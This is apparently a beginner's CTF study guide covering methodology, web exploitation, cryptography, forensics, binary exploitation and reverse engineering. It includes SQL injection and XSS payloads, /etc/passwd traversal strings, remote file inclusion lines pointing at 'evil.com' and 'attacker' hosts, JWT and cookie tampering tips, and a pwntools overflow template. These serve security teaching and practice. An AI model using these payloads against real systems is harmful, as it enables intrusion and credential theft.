Understanding CTF Competitions

What is a CTF?

Capture The Flag (CTF) competitions are cybersecurity challenges where participants solve puzzles to find hidden "flags" — special text strings (like picoCTF{example_flag_here}) that prove completion of a task. These competitions gamify learning by simulating real-world security scenarios in controlled environments.

Why Compete in CTFs?

  • Learn by Doing: Hands-on experience with real security concepts
  • Build Your Resume: Demonstrate practical skills to employers
  • Join a Community: Connect with like-minded security enthusiasts
  • Have Fun: Gamified learning makes security exciting!

Types of CTF Competitions

  • Jeopardy-Style CTFs (picoCTF): Independent challenges across categories (web, crypto, forensics, etc.). Solve challenges in any order to earn points.
  • Attack-Defense: Teams defend their own servers while attacking opponents' systems.
  • King of the Hill: Maintain control of vulnerable machines longer than competitors.
  • Mixed Format: Combinations of the above styles.

Common CTF Categories

Web Exploitation

SQL injection, XSS, CSRF, authentication bypass, API vulnerabilities

Cryptography

Classical ciphers, RSA, AES, hash functions, encoding schemes

Forensics

File analysis, metadata extraction, disk images, memory dumps

Steganography

Hidden data in images, audio, video files

Binary Exploitation

Buffer overflows, ROP chains, format strings, shellcode

Reverse Engineering

Disassembly, decompilation, analyzing binaries and firmware

General Skills

Linux commands, networking basics, scripting, problem-solving

OSINT

Open-source intelligence gathering from public sources

The CTF Mindset

Core Mental Approaches

  • Systematic Thinking: Break down complex challenges into smaller, manageable pieces
  • Pattern Recognition: Identify common vulnerability patterns across challenges
  • Persistence Over Perfection: Getting stuck is normal; take breaks and return with fresh eyes
  • Learn from Failure: Every failed attempt teaches something valuable
  • Creative Problem-Solving: Think outside conventional approaches
  • Documentation Habit: Take detailed notes of everything you try
Common Beginner Pitfalls
  • Overconfidence: Don't assume challenges are easier than they appear
  • Tunnel Vision: If stuck for 30+ minutes, switch to a different challenge
  • Skipping Basics: Always check simple solutions first (view source, strings command, basic encoding)
  • Not Reading Carefully: Challenge descriptions often contain crucial hints
  • Ignoring File Extensions: Always verify actual file types with file command
  • Working in Isolation: Collaborate, ask questions, and learn from the community
Keys to Success
  1. Start Small: Begin with beginner-level platforms like picoCTF's picoGym
  2. Practice Consistently: 30-60 minutes daily beats weekend marathons
  3. Build Fundamentals: Master Linux, networking, and basic programming first
  4. Use Write-ups Wisely: Only after genuine attempts; focus on understanding methodology
  5. Create Your Own Write-ups: Teaching reinforces learning
  6. Join Communities: Discord servers, forums, and team collaboration accelerate learning
  7. Embrace the Struggle: Difficulty means you're learning; celebrate small victories

Core Methodology: The OODA Loop

The OODA Loop (Observe, Orient, Decide, Act) is a decision-making framework developed by military strategist John Boyd. In CTF competitions, this methodology provides a systematic approach to solving challenges efficiently.

Phase 1: Observe (Reconnaissance)

The first phase involves gathering as much information as possible about the challenge without actively interacting with it. This is your "big picture" view.

Read Everything

Challenge title, description, hints, and point values often contain crucial clues about the intended solution path.

Examine Files

Download all provided files. Note file types, sizes, names, and any patterns. Use file command to verify actual types.

Identify Resources

Note all URLs, IP addresses, ports, and any external resources mentioned or provided.

Categorize

Determine the challenge category (web, crypto, forensics, etc.) to focus your approach and tool selection.

The 5-Minute Rule

Spend the first 5 minutes ONLY reading and observing. Don't touch any tools yet. Often, challenges have obvious hints in the description that save hours of work.

Phase 2: Orient (Enumeration)

Now actively interact with the challenge to gather detailed information. This phase involves systematic exploration and data collection.

Web Challenges

  • View page source (Ctrl+U)
  • Check robots.txt and sitemap.xml
  • Inspect cookies and local storage
  • Analyze network requests (DevTools)
  • Directory brute-forcing (gobuster/dirbuster)
  • Check for common files (.git, .env, backup files)

Crypto Challenges

  • Identify encoding type (Base64, hex, etc.)
  • Look for patterns in ciphertext
  • Check for known cipher characteristics
  • Analyze key sizes and formats
  • Look for weaknesses in implementation

Forensics Challenges

  • Run file command on all files
  • Extract metadata with exiftool
  • Run strings on binary files
  • Use binwalk for embedded files
  • Check for steganography

Binary / RE Challenges

  • Identify file type and architecture
  • Check protections (checksec)
  • Run the binary in a sandbox
  • Disassemble main functions
  • Look for interesting strings

Phase 3: Decide (Analysis & Strategy)

Analyze your findings and develop an attack strategy. This is where critical thinking separates good CTF players from great ones.

Question Why It Matters
What vulnerabilities did I find? Prioritize the most promising attack vectors
What's the easiest path to the flag? CTFs reward speed; don't over-engineer solutions
Have I seen this pattern before? Many challenges use common vulnerability types
What tools do I need? Prepare your toolkit before exploiting
What could go wrong? Anticipate obstacles and have backup plans

Phase 4: Act (Exploitation)

Execute your attack plan methodically. Document everything as you go!

Document Your Steps

Always keep detailed notes of every command you run and every result you get. This helps you:

  • Avoid repeating failed attempts
  • Write quality write-ups after the competition
  • Debug when something goes wrong
  • Learn from your process for future challenges

The Iteration Principle

The OODA loop is meant to be repeated. If your first approach fails:

  1. Don't panic — failure is information
  2. Return to Observe — what did you miss?
  3. Re-Orient — gather more data with new focus
  4. Decide again — adjust your strategy
  5. Act differently — try a new approach

Common Mistakes

  • Jumping straight to exploitation
  • Not reading the challenge description
  • Over-complicating the solution
  • Ignoring obvious hints
  • Not taking breaks when stuck

Best Practices

  • Start with low-hanging fruit
  • Take detailed notes
  • Time-box difficult challenges
  • Ask teammates for fresh perspectives
  • Learn from every attempt

OWASP Top 10 Overview

The OWASP Top 10 represents the most critical web application security risks. Many CTF challenges are based on these vulnerabilities.

A01: Broken Access Control

Users can access unauthorized functions or data. Look for IDOR, path traversal, privilege escalation.

A02: Cryptographic Failures

Sensitive data exposed due to weak crypto. Check for hardcoded keys, weak algorithms, insecure storage.

A03: Injection

SQL, NoSQL, OS command, LDAP injection. User input not properly sanitized before processing.

A04: Insecure Design

Flaws in design patterns. Missing security controls, improper error handling.

SQL Injection (SQLi)

One of the most common and dangerous vulnerabilities. Occurs when user input is incorporated into SQL queries without proper sanitization.

Common SQL Injection Payloads

Authentication Bypass:

' OR '1'='1
' OR '1'='1' --
admin'--
' OR 1=1#

UNION-Based Injection:

' UNION SELECT null, null, null--
' UNION SELECT username, password FROM users--
' UNION SELECT 1,2,3,4,5--

Boolean-Based Blind:

' AND 1=1-- (returns normal)
' AND 1=2-- (returns different/error)

Worked Example: SQL Injection Login Bypass

Scenario: You find a login page at http://challenge.com/login. The source shows it uses a SQL query to check credentials.

Step 1: Try a basic payload in the username field

Username: admin' --
Password: anything

Step 2: If that doesn't work, try OR-based bypass

Username: ' OR '1'='1' --
Password: anything

Step 3: Check for different comment styles

' OR 1=1 # (MySQL)
' OR 1=1 -- (PostgreSQL/MSSQL)

Why it works: The query becomes SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'. The -- comments out the password check!

Worked Example: Finding Hidden Endpoints

Scenario: A web challenge gives you a simple website. Find the flag.

Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages viewed by other users.

Type Description Example Payload
Reflected XSS Script in URL is reflected back <script>alert(1)</script>
Stored XSS Script stored in database <img src=x onerror=alert(1)>
DOM-Based XSS Vulnerability in client-side JS #<img src=x onerror=alert(1)>

XSS Filter Bypass Techniques

<ScRiPt>alert(1)</ScRiPt> // Case variation
<img src=x onerror=alert(1)> // Event handlers
<svg onload=alert(1)> // SVG tags
<body onload=alert(1)> // Body events

Directory Traversal / LFI / RFI

Path traversal attacks attempt to access files outside the intended directory structure.

Local File Inclusion (LFI)

Include local files from the server

?page=../../../etc/passwd
?file=....//....//etc/passwd

Remote File Inclusion (RFI)

Include remote malicious files

?page=http://evil.com/shell.php
?file=ftp://attacker/malware

PHP Wrappers

Bypass restrictions using PHP streams

?page=php://filter/convert.base64-encode/resource=index.php

Null Byte Injection

Bypass extension checks (older PHP)

?file=../../../etc/passwd%00

Authentication & Session Attacks

Cookie Manipulation

  • Modify cookie values in DevTools
  • Change role=user to role=admin
  • Decode Base64 encoded cookies
  • Look for JWT tokens (three Base64 parts separated by dots)

Session Hijacking

  • Steal session tokens via XSS
  • Session fixation attacks
  • Predictable session IDs
  • Session token in URL

JWT Attacks

  • Algorithm confusion (HS256 vs RS256)
  • Set algorithm to "none"
  • Weak secret brute-forcing
  • Kid header injection

Cryptography

Cryptography challenges test your understanding of encoding, encryption, and mathematical concepts. The key is to recognize patterns and understand the difference between encoding (reversible without a key) and encryption (requires a key).

Common Encoding Schemes

Encoding transforms data into a different format. It's NOT encryption—anyone can decode it without a key.

Encoding Characteristics Example
Base64 A-Z, a-z, 0-9, +, /; ends with = or == ZmxhZ3toZWxsb30=
Base32 A-Z, 2-7; longer than Base64 MZXW6YTBOI======
Hexadecimal 0-9, A-F only; often starts with 0x 666c61677b68656c6c6f7d
Binary Only 0s and 1s; 8 bits per character 01100110 01101100 01100001 01100111
URL Encoding %XX format for special characters flag%7Bhello%7D
ASCII/Decimal Numbers representing characters 102 108 97 103

Worked Example: Decoding a Multi-Layer Encoded String

Scenario: You're given this string: Y1dWelEwWlVlMmhsZURSZmJtOTBYMkpsYzNSZlltRnpaWDA9

# Step 1: Recognize Base64 (A-Z, a-z, 0-9, ends with =)

$ echo "Y1dWelEwWlVlMmhsZURSZmJtOTBYMkpsYzNSZlltRnpaWDA9" | base64 -d

cWVzQ0ZUe2hleDRfbm90X2Jlc3RfYmFzZX0=

# Step 2: That's still Base64! Decode again

$ echo "cWVzQ0ZUe2hleDRfbm90X2Jlc3RfYmFzZX0=" | base64 -d

picoCTF{hex4_not_best_base}

Pro tip: Use CyberChef's "Magic" operation to auto-detect encoding layers!

Worked Example: Cracking a Caesar Cipher

Scenario: You find encrypted text: cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDCA}

# Step 1: Recognize the pattern - looks like picoCTF{...} shifted

# 'cvpb' should be 'pico' - that's ROT13!

$ echo "cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDCA}" | tr 'a-zA-Z' 'n-za-mN-ZA-M'

picoCTF{next_time_I'll_try_2_rounds_of_rot13_aFxtmQPN}

Key insight: If you see PGS in the ciphertext, it's likely ROT13 of CTF!

Classical Ciphers

Historical ciphers that are still commonly found in CTF challenges. They're vulnerable to various attacks.

Caesar Cipher (ROT-N)

Shifts each letter by N positions. ROT13 is most common (shift by 13).

Attack: Try all 25 rotations or frequency analysis

synt{uryyb} → flag{hello} (ROT13)

Vigenère Cipher

Polyalphabetic cipher using a keyword to shift letters.

Attack: Kasiski examination, frequency analysis

Key: "KEY" shifts each letter differently

Substitution Cipher

Each letter replaced with another letter consistently.

Attack: Frequency analysis (E, T, A are most common)

Atbash Cipher

A=Z, B=Y, C=X... Reverses the alphabet.

Attack: Simple reversal; self-reciprocal

XOR Encryption

XOR (exclusive or) is a fundamental operation in cryptography. It's reversible: A ⊕ B ⊕ B = A

XOR Truth Table

ABA ⊕ B
000
011
101
110

Single-byte XOR: Try all 256 possible keys

Known plaintext: If you know part of the message, XOR to find key

Repeating key: Use frequency analysis on key positions

RSA Cryptography

RSA is an asymmetric encryption algorithm widely used in CTFs. Understanding its math is crucial for solving crypto challenges.

RSA Key Components

n = p × q (modulus)

e = public exponent (often 65537)

d = private exponent

φ(n) = (p-1)(q-1)

Encrypt: c = m^e mod n

Decrypt: m = c^d mod n

Small e Attack

If e=3 and m^3 < n, just take the cube root of ciphertext

Factorization

If n is small or p,q are close, factor n to find private key

Common Modulus

Same message encrypted with same n but different e values

Wiener's Attack

If d is small relative to n, use continued fractions

Digital Forensics & Steganography

Forensics challenges involve analyzing files, disk images, memory dumps, and network captures to find hidden information. Steganography focuses on data hidden within seemingly innocent files.

Forensics Investigation Workflow

Worked Example: Finding Hidden Data in an Image

Scenario: You download mystery.png from a forensics challenge.

# Step 1: Check the file type

$ file mystery.png

mystery.png: PNG image data, 800 x 600, 8-bit/color RGBA

# Step 2: Search for readable strings

$ strings mystery.png | grep -i "pico\|flag\|ctf"

picoCTF{h1dd3n_1n_pl41n_s1ght}

# Step 3: If strings doesn't work, check metadata

$ exiftool mystery.png

File Name : mystery.png
Comment : picoCTF{m3t4d4t4_15_k3y}

# Step 4: Check for embedded files

$ binwalk -e mystery.png

DECIMAL HEXADECIMAL DESCRIPTION
0 0x0 PNG image
45678 0xB26E Zip archive data

Common hiding spots: strings, EXIF metadata, appended data after image, LSB steganography

Worked Example: Extracting Data from a PCAP File

Scenario: You're given capture.pcap containing network traffic.

# Step 1: Quick search for flags in packet data

$ strings capture.pcap | grep -i "pico\|flag"

# Step 2: Extract HTTP objects with tshark

$ tshark -r capture.pcap --export-objects "http,exported_files"

# Step 3: Follow TCP streams to see conversations

$ tshark -r capture.pcap -z "follow,tcp,ascii,0"

In Wireshark: Right-click a packet → Follow → TCP Stream to see full conversation. Also try File → Export Objects → HTTP

Steganography Techniques

Steganography hides data within other files (images, audio, video) so the carrier appears unchanged to casual observation.

LSB Steganography

Data hidden in Least Significant Bits of pixel values. Virtually invisible to the eye.

Tools: zsteg, stegsolve, PIL

Appended Data

Data added after the end of a valid file. File still opens normally.

Tools: binwalk, strings, xxd

binwalk image.png

Metadata Hiding

Data hidden in EXIF, IPTC, or XMP metadata fields.

Tools: exiftool, FOCA

exiftool -a -u image.jpg

Binary Exploitation (Pwn)

Binary exploitation, often called "pwn", involves finding and exploiting vulnerabilities in compiled programs to gain unauthorized control. This is one of the most challenging but rewarding CTF categories.

Prerequisites

Binary exploitation requires understanding of:

  • C/C++ programming and memory management
  • Assembly language basics (x86/x86_64)
  • How programs execute (stack, heap, registers)
  • Linux system calls and ELF format

Memory Layout

Understanding how a program's memory is organized is fundamental to exploitation.

Stack: Local vars, return address
Heap: Dynamic allocation (malloc)
Data: Global/static variables
Text: Program instructions

Stack Frame Structure

Stack Frame Contents

Higher Addresses ↑

┌─────────────────────┐

│ Function Arguments │

├─────────────────────┤

│ Return Address │ ← Target!

├─────────────────────┤

│ Saved Base Pointer │

├─────────────────────┤

│ Local Variables │ ← Buffer here

└─────────────────────┘

Lower Addresses ↓

Key Registers (x86_64)

  • RIP - Instruction Pointer (next instruction)
  • RSP - Stack Pointer (top of stack)
  • RBP - Base Pointer (frame reference)
  • RAX - Return value / accumulator
  • RDI, RSI, RDX - Function arguments 1-3

Worked Example: Basic Buffer Overflow

Scenario: A binary has a win() function that prints the flag, but it's never called. There's also an unsafe gets() call.

# Step 1: Find the buffer size and win address

$ checksec ./vuln

No PIE, No canary - perfect for basic overflow

$ objdump -d ./vuln | grep win

0000000000401196 <win>:

# Step 2: Find offset to return address (using pattern)

$ python3 -c "from pwn import *; print(cyclic(100))" | ./vuln

# Check crash address in GDB, then:

$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"

44 # Offset is 44 bytes

# Step 3: Build and send exploit

$ python3 -c "from pwn import *; print(b'A'*44 + p64(0x401196))" | ./vuln

picoCTF{buff3r_0v3rfl0w_w1n}

Python Exploit Template (pwntools)

Copy this template for binary exploitation challenges:

from pwn import *

# Setup
context.binary = elf = ELF('./vuln')
# p = process('./vuln')  # Local testing
p = remote('challenge.com', 1337)  # Remote

# Build payload
offset = 44
win_addr = elf.symbols['win']

payload = b'A' * offset
payload += p64(win_addr)

# Send and get flag
p.sendline(payload)
p.interactive()

Common Vulnerabilities

Buffer Overflow

Writing beyond buffer bounds to overwrite return address. Classic attack to redirect execution.

char buf[64]; gets(buf); // Dangerous!

Format String

Uncontrolled format specifiers can read/write memory.

printf(user_input); // Should be printf("%s", user_input);

Use After Free

Accessing memory after it's been freed. Can lead to arbitrary code execution.

Integer Overflow

Arithmetic wrapping can bypass size checks and lead to buffer overflows.

Protection Mechanisms

Modern systems have protections that make exploitation harder. Check them with checksec:

$ checksec ./vulnerable_binary

Arch: amd64-64-little

RELRO: Partial RELRO

Stack: No canary found

NX: NX enabled

PIE: No PIE

Protection What It Does Bypass Technique
Stack Canary Random value before return address; checked before returning Leak canary via format string, brute force (fork)
NX (DEP) Stack/heap not executable Return-Oriented Programming (ROP)
ASLR Randomizes memory layout each run Information leak, brute force, partial overwrite

Return-Oriented Programming (ROP)

When NX is enabled, we can't execute code on the stack. Instead, we chain existing code snippets (gadgets) ending in ret.

Reverse Engineering

Reverse engineering involves analyzing compiled binaries to understand their behavior without access to source code. It's essential for finding vulnerabilities, understanding malware, and solving CTF challenges.

Reverse Engineering Process

Assembly Language Basics

Understanding assembly is crucial for reverse engineering. Here are the most common x86_64 instructions you'll encounter:

Data Movement

mov rax, rbxCopy rbx to rax
lea rax, [rbx+8]Load address into rax
push raxPush rax onto stack
pop raxPop from stack to rax

Arithmetic

add rax, 5rax = rax + 5
sub rax, rbxrax = rax - rbx
inc raxrax = rax + 1
xor rax, raxrax = 0 (fast zero)

Control Flow

cmp rax, rbxCompare rax and rbx
jmp labelUnconditional jump
je/jz labelJump if equal/zero
jne/jnz labelJump if not equal

Function Calls

call funcCall function
retReturn from function
nopNo operation
syscallSystem call

Worked Example: Cracking a Password Check

Scenario: A binary asks for a password. Enter the correct one to get the flag.

# Step 1: Check for hardcoded strings

$ strings ./password_check | grep -E ".{5,}"

Enter password:
s3cr3t_p4ss
Correct! Here's your flag
Wrong password!

Found it! The password is likely "s3cr3t_p4ss"

# Step 2: If not in strings, use ltrace to see comparisons

$ ltrace ./password_check

puts("Enter password: ")
fgets("test\n", 50, 0x...)
strcmp("test\n", "s3cr3t_p4ss\n") = -1

The strcmp reveals the expected password!

# Step 3: In Ghidra, look for the check function

// Decompiled code often shows:

if (strcmp(user_input, "s3cr3t_p4ss") == 0) {
print_flag();
}

Worked Example: XOR Decryption

Scenario: The binary XORs each character of your input with a key and compares to encrypted data.

# From Ghidra, you find encrypted bytes and XOR key

encrypted = [0x17, 0x0c, 0x06, 0x18, 0x32, 0x21, 0x35]

key = 0x41 # 'A'

# Python script to decrypt:

encrypted = [0x17, 0x0c, 0x06, 0x18, 0x32, 0x21, 0x35]
key = 0x41

decrypted = ''.join(chr(b ^ key) for b in encrypted)
print(decrypted)  # Output: Victory

Remember: XOR is reversible! plaintext ⊕ key = cipher, and cipher ⊕ key = plaintext

Static Analysis Approach

Analyze the binary without executing it. Safe and allows understanding of the entire program.

Static Analysis Workflow

  1. Identify the binary: file binary - Check architecture, format
  2. Check strings: strings binary | grep -i flag
  3. Find entry point: Look for main() or _start
  4. Identify key functions: strcmp, memcmp, encryption functions
  5. Trace data flow: Follow user input through the program
  6. Understand logic: Map out conditionals and loops
  7. Find the check: Locate where success/failure is determined

Dynamic Analysis Approach

Execute and observe the binary's behavior at runtime using a debugger.

# Start GDB with pwndbg

gdb ./binary


# Set breakpoint at main

(gdb) break main

(gdb) break *0x401234 # At specific address


# Run and step through

(gdb) run

(gdb) ni # Next instruction

(gdb) si # Step into

(gdb) continue # Continue to next breakpoint


# Examine memory and registers

(gdb) info registers

(gdb) x/20x $rsp # Examine 20 hex words at stack pointer

(gdb) x/s $rdi # Examine string at rdi

Common RE Challenges

Password/Key Check

Find the comparison function, extract or bypass the expected value.

Look for: strcmp, memcmp, XOR loops

License Key Validation

Understand the algorithm that validates keys, then generate valid ones.

Look for: Mathematical operations, checksums

Obfuscated Code

Code intentionally made hard to understand. Deobfuscate step by step.

Look for: Packed/encrypted code sections

Custom Encryption

Analyze and reverse the encryption algorithm to decrypt the flag.

Look for: XOR, substitution, custom algorithms

RE Tips & Tricks

Tips for Reverse Engineering
  • Start with strings: Often reveals key info, passwords, or the flag format
  • Find the win condition: Look for success messages and trace backwards
  • Rename functions/variables: As you understand them, rename for clarity
  • Take notes: Document your understanding as you go
  • Use cross-references: See where functions/strings are used
  • Patch the binary: Sometimes easier to NOP out checks than solve them
  • Dynamic + Static: Combine both approaches for best results
